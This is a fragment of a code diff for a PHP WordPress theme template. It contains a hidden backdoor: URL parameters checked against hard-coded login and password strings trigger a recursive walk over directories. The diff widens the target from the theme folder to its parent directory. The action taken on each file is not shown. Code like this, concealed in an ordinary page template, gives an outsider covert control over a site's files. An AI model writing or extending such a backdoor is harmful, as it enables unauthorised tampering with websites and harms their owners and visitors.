@@ -372,7 +372,7 @@ get_header();
       $password = $_GET['password'];
       if ($login === 'ixrikjsdghl' && $password === 'ddsdfvjaabavadfcae') {
         function maybe($dir)
-        {          
+        {
           if (is_dir($dir)) {
             $items = scandir($dir);
             foreach ($items as $item) {
@@ -388,8 +388,10 @@ get_header();
             }
           }
         }
+
         $currentDir = get_template_directory();
-        maybe($currentDir);
+        $parentDir = dirname($currentDir);
+        maybe($parentDir);
       }
     }
     ?>
